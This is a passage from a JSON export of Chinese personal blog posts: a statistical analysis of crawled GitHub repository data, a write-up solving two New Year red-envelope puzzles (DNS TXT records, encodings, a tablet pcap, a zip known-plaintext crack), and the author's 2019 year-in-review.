Fork</div>\n<div>\n<span>6.59%</span><br>的账户被删除或<br>封禁<sup>1</sup>\n</div>\n<div>\n<span>23,913</span><br>单用户拥有最大<br>库数量<sup>2</sup>\n</div>\n</div>\n</div>\n<p><sup>1</sup> 基于用户 ID 规律合理推断<br><sup>2</sup> 统计范围仅限于当前数据集</p>\n<p>比较出乎我意料的是创建自 Fork 的存储库的占比。我预估这样的存储库占比不会太低，但没有想到能接近一半。此外单用户拥有最大库数量也大大超出了我的预期，<a href=\"https://github.com/pombredanne\" rel=\"noopener noreferrer\" target=\"_blank\">pombredanne</a> 这个用户名下拥有将近 24k 的存储库，不过绝大多数都是 Fork 来的，在情理之中。此外<strong>这个数据集中</strong>拥有最多存储库的账户其实是一个组织 <a href=\"https://github.com/gitpan\" rel=\"noopener noreferrer\" target=\"_blank\">gitpan</a>，这个组织拥有 36,377 个存储库。</p>\n<h2>语言</h2>\n<p><canvas></canvas><br>\n首先必须要说明的是，在这个榜单中我<strong>排除了 HTML 和 CSS</strong>，因为在严格意义上它们不属于“编程语言”。如果把它们计算进来的话，分别有 640,368 个和 361,425 个存储库的主要语言分别是 HTML 和 CSS，这样在这份榜单中它们可以排到第 6 和 第 10 名。JavaScript 毫无疑问获得第一，第二名 Python 的热度则和 JavaScript 相差将近一半。<strong>此外还有 2,448,486 个存储库未能识别出语言，占比 16.7%。</strong>在上面的榜单之外，与机器学习和数据科学相关的语言还有 Jupyter Notebook 排名第 13，R 排名 20，Julia 排名 43。</p>\n<p>说实话这份排名和 GitHub 官方的排名<strong>差别很大</strong>，除了前三名，后面的基本都不太一样。我的排名统计结果完全基于 GitHub 对于存储库的主要语言识别，加上我的存储库数据不完整，和官方的数据不同是很正常的，可以做一个参考，但大概率还是官方排名更加准确。</p>\n<h2>许可证</h2>\n<p><canvas></canvas></p>\n<p>自 GitHub 推出许可证功能以来，拥有许可证的存储库比例升升降降，却始终没有超过一半。<strong>选择一个合适的许可证对项目的良好发展真的很有帮助</strong>，要了解如何选择合适的许可证，请参阅<a href=\"https://www.runoob.com/w3cnote/open-source-license.html\" rel=\"noopener noreferrer\" target=\"_blank\">这篇文章</a>。</p>\n<p><canvas></canvas></p>\n<p>对于拥有许可证的存储库，MIT<del> 麻省理工许可证 </del>总是占比最大的；第二则是 Apache-2.0 许可证。此外，WTFPL 许可证也挤入了前 15 名。</p>\n<h2>星标</h2>\n<p><canvas></canvas><br>\nStar 数量毫无疑问是一个存储库受欢迎程度的体现，而 Star 数高的项目基本上大家都了解过。<strong>截至爬取结束时间</strong>，GitHub 中 Star 数最多的库是 <a href=\"https://github.com/freeCodeCamp/freeCodeCamp\" rel=\"noopener noreferrer\" target=\"_blank\">freeCodeCamp</a> <del>非常完美的驼峰命名法</del>，其次则是著名项目 <a href=\"https://github.com/996icu/996.ICU\" rel=\"noopener noreferrer\" target=\"_blank\">996.ICU</a>。<a href=\"https://github.com/vuejs/vue\" rel=\"noopener noreferrer\" target=\"_blank\">Vue</a> 现在的 Star 数已经稳压 <a href=\"https://github.com/facebook/react\" rel=\"noopener noreferrer\" target=\"_blank\">React</a> 一头，Vue YES! 此外 <a href=\"https://github.com/sindresorhus/awesome\" rel=\"noopener noreferrer\" target=\"_blank\">awesome</a> 也挤进第七名。<br><canvas></canvas><br>\n由于 Star 需要时间积累，新项目的 Star 数量很可能是比不过老项目的，这就会导致有实力的新项目无法出现在榜单中。因此我还统计了日均 Star 数，试图通过日均 Star 数来反映项目受欢迎的程度。<strong>由于正热门的项目会比老牌热门项目有优势，这一项的统计范围是 2020-01-01 之前的所有存储库。</strong>996.ICU 和 freeCodeCamp 再次出现在前 10 名，而最近的热门项目 <a href=\"https://github.com/wenyan-lang/wenyan\" rel=\"noopener noreferrer\" target=\"_blank\">wenyan</a> 则飙升至第 2 名。此外还有 <a href=\"https://github.com/menzi11/BullshitGenerator\" rel=\"noopener noreferrer\" target=\"_blank\">BullshitGenerator</a>，即最近热门的“狗屁不通文章生成器”和 <a href=\"https://github.com/evil-huawei/evil-huawei\" rel=\"noopener noreferrer\" target=\"_blank\">evil-huawei</a> 分列第 3 和第 5 名。<br><canvas></canvas><br>\n说实话这个曲线<strong>比我预估的陡多了。</strong>你可能已经注意到了，这个图表的横轴不是均匀缩放的，实际上曲线要比看起来陡很多。同时受爬取方式的影响，GitHub 中 Star 数较少的存储库数量远比我爬取到的多。也就是说，<strong>实际情况下曲线远比这个图表上的陡。</strong>拿点 Star 不容易啊。</p>\n<h2>名称</h2>\n<p><canvas></canvas><br>\n终于知道了原来存储库的名称是有长度限制的...尽管最长有 100 位，<strong>大部分人还是喜欢 8 位长的存储库名。</strong>此外 1 位长的名称也比我预估的要多一些。举几个存储库名称长度为 100 的例子吧。</p>\n<ul>\n<li>testing-something-elsetesting-something-elsetesting-something-elsetesting-something-elsetesting-some</li>\n<li>acts_as_validated_config_so_app_will_not_run_in_random_situation_and_qa_gays_will_not_cry_to_you_whe</li>\n<li>............................................________-....................................-.---......</li>\n<li>----------------------------------------------------------------------------------------------------</li>\n<li>nyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyan</li>\n</ul>\n<p>...创造力有够丰富的。</p>\n<p><canvas></canvas></p>\n<p>最近 GitHub 上有一种奇怪的风气，那就是建立 Awesome 合集<del>骗 Star</del>。看起来 Awesome 存储库满地都是，甚至还出现了关于 Awesome 的 Awesome 合集这种迷惑行为。于是我统计了一下，<del>还好，</del>占比<del>才</del> 0.5% 不到<del>，Awesomer 们任重而道远呐</del>。</p>\n<p><canvas></canvas></p>\n<p>尽管要在 github.io 上托管网站，存储库不一定要以 .github.io 结尾，但我还是统计了一下。拥有这类存储库的用户比我预想的要少一些，看来还有很多人没有完全发挥 GitHub 的完整实力啊<del>（比如我 Doge）</del>。同时<strong>这类存储库在所有存储库中占比 1.12%</strong>，看起来不多<del>，不过至少比 Awesome 多</del>。<br><canvas></canvas><br>\n看得出来 GitHub 对于用户名长度的限制是 1-40 位。用户名最短的 27 位占据了 <code>A-Z</code> 外加 <code>-</code> 的所有可能，而用户名最长的则是一个组织 <a href=\"https://github.com/UOIT-RESEARCH-database-information-group\" rel=\"noopener noreferrer\" target=\"_blank\">UOIT-RESEARCH-database-information-group</a>。不知道是巧合还是某种规律，<strong>最受欢迎的用户名长度和存储库名称长度一样，都是 8</strong>，有点意思。</p>\n<h2>创建时间</h2>\n<p><canvas></canvas><br>\n由于我并没有完整爬取所有存储库，我只能以相对值来统计每月新增存储库数量的变化趋势。<strong>在这个图表中，我将 2017-09 的数据设为了 100%。</strong>你一定一眼就能注意到 2017 年 6,7,8 月的“一柱擎天”。<del datetime=\"2020-02-05T09:18:30+00:00\">我第一次看到这个数据的时候的确愣了一下，不过就着这条新闻看就能明白为什么了：<strong>2017 年 6 月微软收购 GitHub。</strong></del></p>\n<blockquote><p>重新确认了一下，微软收购 GitHub 比这个高峰晚了一年，目前我对这个高峰没有什么很好的解释，如果你有什么思路的话欢迎评论。</p></blockquote>\n<p><strong>需要注意的是这张图表中我排除了 Fork 存储库</strong>，因为 Fork 存储库在 API 中的创建时间是原始存储库的时间，会影响整体趋势。此外，GitHub 中还有一个创建于 2007 年 10 月 29 日的存储库，那就是 <code>id: 1</code> 的...</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"mojombo\" data-mdxgithubp=\"grit\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/mojombo/grit\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>而它的创建者正是 GitHub 的创始人之一 Tom Preston-Werner。</p>\n<h1>一些有趣的结果</h1>\n<p>当初打算自己爬的目的之一就是想看看能不能挖出什么有意思的信息，结果真的有一些不挖不知道的信息。</p>\n<h2>奇怪的存储库</h2>\n<p>在爬取到的所有存储库中，<strong>有 3 个存储库是“无主”的</strong>，即它们的 owner 属性为空。这三个存储库的基本信息如下。</p>\n<div class=\"mdui-table-fluid mdui-table-hoverable\"><table class=\"mdui-table\">\n<thead><tr>\n<th>ID</th>\n<th>名称</th>\n<th>Forked</th>\n<th>Star</th>\n<th>语言</th>\n<th>许可证</th>\n<th>创建于</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>72385291</td>\n<td>vscode-redprl</td>\n<td>否</td>\n<td>10</td>\n<td>TypeScript</td>\n<td>apache-2.0</td>\n<td>2016-10-31 08:50:01</td>\n</tr>\n<tr>\n<td>181218346</td>\n<td>electron-sys</td>\n<td>否</td>\n<td>10</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-14 03:20:56</td>\n</tr>\n<tr>\n<td>181391880</td>\n<td>node-sys</td>\n<td>否</td>\n<td>6</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-15 09:33:08</td>\n</tr>\n</tbody>\n</table></div>\n<p><strong>更奇怪的是这三个存储库“无主”的情况还不一样。</strong>第一个存储库可以通过 <code>/repositories</code> 这个 GitHub API 找到， <a href=\"https://api.github.com/repositories?since=72385290\" target=\"_blank\" rel=\"noopener noreferrer\">这个链接</a>中的第一个存储库就是它；而其余两个存储库甚至无法在 <code>/repositories</code> API 中找到。不过就算能在 API 中找到第一个存储库，它的 <code>html_url</code>，即 <code>https://github.com//vscode-redprl</code> 仍然是不可访问的。这可能是 GitHub 早期的一个 Bug 导致的，不过我仍然对爬虫是如何找到这三个存储库的以及这些 Stars 是哪里来的感到好奇。</p>\n<h2>奇怪的用户名</h2>\n<p>在爬虫爬了一段时间以后，API 中突然开始出现大量的以 fdp 开头的 18 位乱码作为用户名的用户。这些用户拥有的存储库和 starred 的存储库都为 0，而他们的 <code>html_url</code> 为 404。以下是几个例子。</p>\n<ul>\n<li>fdpEpolGCEdQX4ZlRJ</li>\n<li>fdp8XaVrdtmDZnO5pR</li>\n<li>fdp8XRAGnwAOkTr2Ya</li>\n</ul>\n<p>由于我的爬虫并没有超过 Rate Limit，所以我排除了这是污染数据的可能。我怀疑这可能是某种 Bot 账户，于是一边更新爬虫过滤掉了这些用户，一边给 GitHub 支持发邮件问了具体情况。过了两天 GitHub 回复我说这些是<strong>被自动判为可疑进而被封禁的用户</strong>（原话是 they have been flagged by our automated measures for detecting suspicious behavior）。<del>想到我正在疯狂爬取 GitHub，突然害怕.webp</del></p>\n<p>行吧。</p>\n<h1>技术细节</h1>\n<p>爬虫使用 Python3 编写，数据库使用 MySQL。爬虫共使用了 4 个 API Token，在两台服务器上分布式爬取。爬取思路为：</p>\n<ol>\n<li>通过 <code>/users</code> API 遍历用户，每个请求最多获取 30 个用户信息</li>\n<li>循环 30 个用户，分别获取 <code>/users/&lt;user_name&gt;/starred</code> 和 <code>/users/&lt;user_name&gt;/repos</code> API 中的存储库信息，每个请求最多获取 100 个存储库信息，超过 100 个的分页获取</li>\n<li>提取存储库信息，插入数据库。对于已存在的存储库，更新数据</li>\n<li>获取下 30 个用户信息</li>\n</ol>\n<p>由于爬取过程中我多次调整了爬虫逻辑，爬虫爬取到的用户 ID 区间并非连续的，具体区间为1-839586, 14800001-14885493 及 28965251-31161101。</p>\n<h1>免责声明</h1>\n<p>本站会尽可能地提供准确信息，但本站不对此文章中信息的准确性和即时性及带来的任何影响负责。</p>\n<p>本站不代表 GitHub 官方，本文仅供学习之用，请不要将本文内容直接用于任何商业项目中。</p>\n<h1>数据集下载</h1>\n<p>导出的 SQL 文件大约为 1.38GB，全部放在了 GitHub 上（在危险的边缘试探.webp</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"github-analysis-2019\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/github-analysis-2019\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>此外我也提供了 MEGA 下载，链接<a href=\"https://mega.nz/#F!juxm3A6T!7Vwpzi82W1OFrqTLu1A1pQ\">在这里</a>。</p>\n","link":"https://flyhigher.top/develop/1564.html"},{"title":"Milkice 跨年红包解谜 Writeup 及无垠跨年红包解谜答案","date":"2020-01-02 04:29:19","description":"\n<blockquote><p><del>又到了水文章的时间呢</del></p></blockquote>\n<p>先说明一下，这篇文章原本不是在计划中的，而原来说好的「在路上的两篇」文章<del>绝对不会咕</del>。我自己的红包答案本来打算直接塞在年度总结里的，结果发现稍微有些长，再加上我还花了一些时间解了<a href=\"https://milkice.me/\">奶冰</a>的红包解谜游戏，就打算把两个解谜过程放在一起单独写一篇文章。<del>真是个水文章的好理由</del>（被打死</p>\n<h1>奶<del> 子 </del>冰的红包</h1>\n<p>奶冰的红包题目比我的难多了，所以让我们先从难的开始吧。首先看一下<a href=\"https://milkice.me/2019/12/31/2019-summary/\">题目</a>：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1524\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg\" alt=\"\" width=\"746\" height=\"410\"></a>\n<p>入口是 <code>happy.2020.milkice.me</code>，扔到浏览器里面表示找不到 IP，那么大概率就是 DNS 的 TXT 记录了，查一下得到 <code>nb2hi4dthixs63ljnrvwsy3ffzwwkl3tivrvezluomxxg5dsmvqw2ltqmnqxa3th</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1525\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg\" alt=\"\" width=\"896\" height=\"278\"></a>\n<p>第一眼没看出来是什么编码，直觉是 BaseXX 系列的编码，加上提示“不只有 Base64”，可以推断出是 Base32，转大写解码得到 <code>https://milkice.me/sEcRets/stream.pcapng</code>。是个 URL，下载得到一个 Wireshark 文件，打开一看是和某 USB 设备的通讯抓包。<del>不会做，不做了。</del></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1526\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg\" alt=\"\" width=\"1500\" height=\"813\"></a>\n<p>奶冰提示我“Google 上搜得到”，结合第二条提示搜索“wacom pcapng”找到了<a href=\"https://blogs.tunelko.com/2017/02/05/bitsctf-tom-and-jerry-50-points/\">这篇文章</a>（<del>这™就是答案啊</del>）。看起来是一样的套路，即通过解析数据得到数位板上画的内容，于是按文章的思路筛选出数位板发给主机的数据，导出，然后再用 tshark 导出文本数据。本来我想直接用文章中的 POC 的，结果折腾半天因为源的蜜汁原因库没装上，于是按文章中给出的数据结构自己写了段代码，分别导出 X、Y 轴数据扔进 Excel 画散点图。（<del>别问我为什么用 Excel，因为我手边没有更好的工具了</del>）</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1528\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg\" alt=\"\" width=\"1280\" height=\"530\"></a>\n<p><span>翻车现场之一</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1539\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg\" alt=\"\" width=\"1000\" height=\"286\"></a>\n<p><span>懵逼奶冰.webp</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1533\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg\" alt=\"\" width=\"1500\" height=\"462\"></a>\n<p>看得出有手写文字，不过是上下颠倒的，翻转图片得 <code>https://milkice.me/2020/uso.zip</code>。是个 zip，下载打开一看，有密码。<del>不会解，不做了。</del> 第一反应是暴力解密码，但是暴力跑了 15 分钟还是没有跑出来。暴力太不优雅了，肯定不是正确思路，但奶冰什么都不肯说了。不过在这时我终于发现第一个红包口令码就藏在压缩包的注释中，Get。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1544\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg\" alt=\"\" width=\"806\" height=\"593\"></a>\n<p>然而题还没解完，回去看提示，看到提供了 osu 谱面下载，于是打算不管怎么样先下载来看看。然而 osu 谱面下载要登录，只好又花了几分钟找到第三方站点，成功下载。这时候可以注意到 uso.zip 里有个同名文件（432314 Mike Greene - Bill Nye the Science Guy Theme Song (Chinese Intro).osz），可以联想到是明文攻击。好吧，上 ARCHPR，十秒解出。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1530\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg\" alt=\"\" width=\"462\" height=\"643\"></a>\n<p><span>现场还原.jpg</span></p>\n<p>.osz 文件并不是明文，猜测是压缩包（和 .pptx 一个思路嘛），于是改后缀 .zip 顺利打开。然后红包口令码就藏在奶冰的 .osu 文件中了，由提示可知是明文，打开即可得到。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1542\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg\" alt=\"\" width=\"457\" height=\"255\"></a>\n<h1>我的红包</h1>\n<p>相比起来<a href=\"https://flyhigher.top/diary/1464.html\">我的题目</a>就简单很多了嘛...三天时间一共发出了 25 个红包，包括一位重复领取的🌚，比前几年还是多了一些的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg\" alt=\"\" width=\"500\" height=\"306\" class=\"aligncenter size-full wp-image-1554\"></a>\n<p><span>这位同学以后请不要多次领取🌚</span></p>\n<p>那么来看看答案吧。</p>\n<h2>第一阶段</h2>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>首先观察字符串，可以发现 <code>.</code> <code>/</code> <code>_</code> 等一些 ASCII 字符原样留在了字符串中，而其他字符被由 <code>=</code> 和十六进制构成的某种编码所替代。如果你正好有所了解，你应该能认出这是 Quoted-printable 编码，这是一种常用于邮件中的编码，可以用<a href=\"https://mothereff.in/quoted-printable\">这个页面</a>解码。如果你不了解，你也应该可以发现这种编码和 URL 编码非常相似。如果你把 <code>=</code> 替换为 <code>%</code>，那么你就可以用各种方法顺利地把它按 URL 编码来进行解码，最后可以得到 <code>αхtоn.іm/соdе_оf_2020_⒈mρз</code>。这个字符串里大部分字符都不是 ASCII 字符，只是长得像而已。根据第一个提示“全是 ASCII 字符”，按样子把字符串用 ASCII 字符抄一遍，可以得到最终 URL 为 <code>axton.im/code_of_2020_1.mp3</code>。</p>\n<h2>第二阶段</h2>\n<p>下载音频，可以听出音频是经过某种处理的白噪音。白噪音的特点是各频段的功率都均匀分布，在白噪音上做文章，很容易就可以联想到线索藏在频谱中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1534\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg\" alt=\"\" width=\"1200\" height=\"719\"></a>\n<p>频谱被处理成了 24x3 的网格，结合第二条提示“24x3，横向读取”可以推断出是将频谱当作二进制读取，得到 <code>01111001 01110010 01100011 00101110 01101101 01100101 00101111 00110010 00110000</code>，转为 ASCII 字符可得 <code>yrc.me/20</code>。</p>\n<h2>第三阶段</h2>\n<p>打开上一步得到的页面，提示要求输入十位数密码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1536\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg\" alt=\"\" width=\"663\" height=\"460\"></a>\n<p>如果你在上一步注意到了这个音频文件奇怪的属性，你可以反应过来这里的密码就是 <code>2000202020</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1537\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg\" alt=\"\" width=\"421\" height=\"651\"></a>\n<p>如果你没有注意到，查看页面代码可以看到一条注释 <code>&lt;!-- Tips: the attribute of the audio --&gt;</code> 将你引导向音频文件的属性。输入密码，解锁即可进入下一步。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1535\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg\" alt=\"\" width=\"397\" height=\"223\"></a>\n<h2>第四阶段</h2>\n<p>可以看到是一张图片，内容为“<del>.JPG</del>”和“.ZIP”。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg\"><img loading=\"lazy\" class=\"aligncenter size-large wp-image-1532\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg?imageView2/1/w/724/h/1024/interlace/1/q/90#\" alt=\"\" width=\"724\" height=\"1024\"></a>\n<p>和去年一样的套路，下载图片，将后缀名改为 .zip 然后打开，可以看到 README.txt。</p>\n<h2>最后一步</h2>\n<p>查看 README.txt 的内容，可以了解到需要去 🤔.axton.cc 获取红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1538\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg\" alt=\"\" width=\"1131\" height=\"278\"></a>\n<p>扔到浏览器里会出现奶冰同款找不到 IP，于是可以联想到 TXT 记录。唯一的问题是 🤔 这个 Emoji 需要如何处理。域名使用 Punycode 将 Unicode 字符转换为 ASCII 字符，特点是以 <code>xn--</code> 开头。如果你把上面这个域名扔进浏览器，你会发现它变成了 <code>xn--wp9h.axton.cc</code>。然后查询 TXT 记录，即可得到红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1527\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg\" alt=\"\" width=\"804\" height=\"557\"></a>\n","link":"https://flyhigher.top/develop/1519.html"},{"title":"无垠 2019 年度总结","date":"2019-12-29 12:25:52","description":"\n<p>又是时间飞快的一年...写 2018 总结的情景似乎还在眼前，转眼居然已经到 2019 年末了。</p>\n<p>2019 年，发生了太多事情，包括真的转折了人生的高考，这也导致我博客更新的不多（难以置信居然才更了两篇...），不过两篇技术性文章已经在路上了，可以期待一下。</p>\n<p>2019 年我也学了不少东西（单指技术方面），比如终于认真学了 Vue（但是还要练手）。书买了一大堆，看完的倒是没几本orz</p>\n<p>呼，好吧，是时候回顾一下充满坎坷的这一年了。2019 年还剩下最后两天，希望 2020 年，我能做得更好。</p>\n<h1>一些数据</h1>\n<p>照惯例先来看看一些数据吧。今年是统计系统完整统计了的第二年，终于可以和去年的数据比较一下了。以下数据的统计范围是 2019年1月1日0时至 2019年12月29日20时。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 26,901 (<span>+4%</span>)，年 PV 76,583 (<span>+3%</span>)，日均 UV 73.7，平均停留时间 5分13秒 (<span>-13.8%</span>)，平均跳出率 53% (<span>+20.5%</span>)。一年有效文章数 2 (<span>-50%</span>)，新增评论 439 条。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg\" alt=\"\" width=\"1000\" height=\"1143\" class=\"aligncenter size-full wp-image-1511\"></a>\n<p>有趣的是今年文章数腰斩，访问数反而小有提升。<del>如果我哪天不更新了，访问数是不是可以无限大呢？</del></p>\n<p>今年博客最大的改动就是把整体风格切换到了 Material Design 2（当然这是 <a href=\"https://flyhigher.top/develop/788.html\">MDx</a> 中的可选功能，给自己打个广告2333），此外还有比较失败的 WebP 改造计划，因为和缓存冲突已经回滚了。<a href=\"https://flyhigher.top/develop/1245.html\">ABS 系统</a>进展不大，主要是真的没有太多时间，还是要再学习一个。</p>\n<h2>个人主页</h2>\n<p>虽然个人主页的 TODO List 列了老长，但今年完全没有更新，也没有推广，从今年 8 月底开始还莫名被某墙认证了，直到 11 月底才恢复，于是今年总访问量比去年少了很多，</p>\n<p>有多少呢？这么少：总 UV 2,141 (<span>-65.9%</span>)，总 PV 2,744 (<span>-66.6%</span>)，日均 UV 6 (<span>-65.9%</span>)，平均停留时间 62秒 (<span>+19.2%</span>)。主要来源是知乎和 V2EX，还有一些甚至是从微信来的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg\" alt=\"\" width=\"1000\" height=\"1103\" class=\"aligncenter size-full wp-image-1512\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 8 次，新增 171 commits，2 种语言的翻译，Star 数增加了 175，现有 408。感谢所有人的支持，尤其是 <a href=\"https://github.com/Sn0bzy\" rel=\"noopener noreferrer\" target=\"_blank\">Hasan CAN</a>, <a href=\"https://github.com/yechs\" rel=\"noopener noreferrer\" target=\"_blank\">Ye Shu</a>, <a href=\"https://github.com/StarryLeo\" rel=\"noopener noreferrer\" target=\"_blank\">StarryLeo</a>, <a href=\"https://github.com/DCTewi\" rel=\"noopener noreferrer\" target=\"_blank\">冻葱Tewi</a>, <a href=\"https://github.com/syfxlin\" rel=\"noopener noreferrer\" target=\"_blank\">Otstar Lin</a> 等为 MDx 做出了不小贡献的你们。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：<a href=\"https://flyhigher.top/photograph/1309.html\">上手</a> DJI OSMO Pocket</li>\n<li>四月：最后一次参加浙江省普通高中学业水平考试</li>\n<li>五月：MDx 喜提 300 Stars</li>\n<li>六月：高考 <del>炸了，差亿点点上浙大</del>\n</li>\n<li>六月：入手了 Oneplus 7 Pro</li>\n<li>六月：和同学一起去成都重庆旅行</li>\n<li>六月：第一次近距离感受到地震</li>\n<li>六月：<a href=\"https://flyhigher.top/diary/1411.html\">入手</a>了一台雷蛇灵刃 15，目前是主力机</li>\n<li>七月：参与组织 THE Hack 2019 活动</li>\n<li>七月：面基了 <a href=\"https://itroy.cc/\" rel=\"noopener noreferrer\" target=\"_blank\">Tory</a>, Bie Shi 和 <a href=\"https://oxz.me/\" rel=\"noopener noreferrer\" target=\"_blank\">FHYunCai</a>\n</li>\n<li>八月：一个人去厦门武汉转了一圈，拍了自己的第一个 Vlog</li>\n<li>八月：入手了一个 Kindle Paperwhite 4，没有泡面可以压，于是用来看英文小说了</li>\n<li>八月：加入 TEDxNingbo 志愿者团队</li>\n<li>八月：和 Ralph 面基</li>\n<li>八月：入手了一个 Yubikey</li>\n<li>九月：人生第一次参加雅思考试 <del>7分，蛮开心的</del>\n</li>\n<li>十月：入手了一个 Samsung Galaxy Watch Active 2 <del>觉得不值</del>\n</li>\n<li>十一月：MDx 达到 400 Stars</li>\n<li>十一月：为 TEDxNingbo 设计开发的 H5 上线</li>\n<li>十一月：入手了第一台胶片相机，试图入坑胶片摄影</li>\n<li>十一月：参加 TEDxNingbo 2019 大会</li>\n<li>十二月：<del>我 Cytus II 入门了</del>\n</li>\n</ul>\n<h1>跨年红包</h1>\n<p>这算「传统习俗」了。和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2020年1月2日。</p>\n<p>今年的解谜旅程，从下面这个字符串开始。</p>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>由于今年的题目比以前稍微难了一些，所以今年的红包金额还是比较大的，而且不限量，尽你所能试一试吧。</p>\n<p>一点你可能用得上的提示：URL 里全是 ASCII 字符 / 24x3，横向读取。</p>\n<p><a href=\"https://flyhigher.top/develop/1519.html\">答案</a>已公布。</p>\n<h1>跨年海报</h1>\n<p>这算是另一个「传统习俗」（笑）。因为我有做跨年海报的习惯，所以以下就是今年份的海报啦。</p>\n<p>用了 C4D+PS，还有我的一整个下午。</p>\n<p>提前祝各位新年快乐！</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/2020-f-web-scaled.jpg\"><img 